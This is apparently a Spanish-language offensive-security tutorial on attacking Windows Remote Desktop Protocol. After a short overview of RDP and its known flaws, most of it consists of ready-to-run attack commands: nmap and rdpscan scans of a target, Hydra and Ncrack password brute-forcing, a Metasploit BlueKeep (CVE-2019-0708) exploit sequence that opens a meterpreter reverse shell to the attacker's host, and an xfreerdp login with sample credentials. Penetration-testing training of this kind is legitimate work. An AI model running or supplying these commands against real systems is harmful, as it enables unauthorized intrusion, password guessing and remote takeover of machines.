# Explotación de RDP (Remote Desktop Protocol)

## 1. ¿Qué es RDP y a qué afecta?

- **Remote Desktop Protocol (RDP)** es un protocolo propietario de Microsoft que permite el acceso remoto a escritorios y servidores Windows.
- Utiliza por defecto el puerto **TCP 3389**.
- Si no está bien configurado, puede ser vulnerable a:
  - Ataques de fuerza bruta.
  - Vulnerabilidades de ejecución remota.
  - Secuestro de sesión o man-in-the-middle.
  - Denegación de servicio (DoS).

RDP afecta principalmente a:
- Servidores Windows expuestos a Internet.
- Estaciones de trabajo con RDP habilitado.
- Entornos de escritorio remoto en la nube (VDI).

---

## 2. Cómo identificar un servicio RDP expuesto

### Escaneo básico con Nmap

Detecta si el puerto 3389 está abierto y si responde como RDP:
```
nmap -p 3389 <IP_OBJETIVO> -sV
```

Con un script NSE para más detalles:
```
nmap -p 3389 --script rdp-ntlm-info <IP_OBJETIVO>
```

O con una herramienta específica:
```
rdpscan <IP_OBJETIVO>
```
*(rdpscan es una herramienta rápida para detectar la vulnerabilidad BlueKeep y versión del RDP).*

---

## 3. Vulnerabilidades conocidas en RDP

- **CVE-2019-0708 (BlueKeep)**
  - Ejecución remota sin autenticación.
  - Afecta a Windows XP, 7, Server 2003 y 2008 sin parches.
  - Se explota enviando paquetes RDP malformados.

- **CVE-2020-0609 y CVE-2020-0610**
  - Vulnerabilidades en la puerta de enlace RDP (RD Gateway).

- **Fuerza bruta**
  - Probar combinaciones de usuario y contraseña con herramientas automáticas.

---

## 4. Cómo explotar RDP

### 4.1 Ataque de fuerza bruta

Con Hydra:
```
hydra -t 4 -V -f -l <USUARIO> -P <DICCIONARIO> rdp://<IP_OBJETIVO>
```

Con Ncrack:
```
ncrack -u <USUARIO> -P <DICCIONARIO> rdp://<IP_OBJETIVO>
```

### 4.2 Explotar BlueKeep (CVE-2019-0708)

En Metasploit:
```
msfconsole
```

Luego:
```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <IP_OBJETIVO>
set RPORT 3389
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <TU_IP>
run
```

### 4.3 Acceso remoto con cliente RDP (xfreerdp)

Si ya tienes las credenciales y sólo quieres conectarte remotamente a la máquina Windows, puedes usar **xfreerdp** desde Linux:
```
xfreerdp /u:<USUARIO> /p:<CONTRASEÑA> /v:<IP_OBJETIVO>
````

Ejemplo completo:
```
xfreerdp /u:administrador /p:contraseña123 /v:192.168.1.1
```


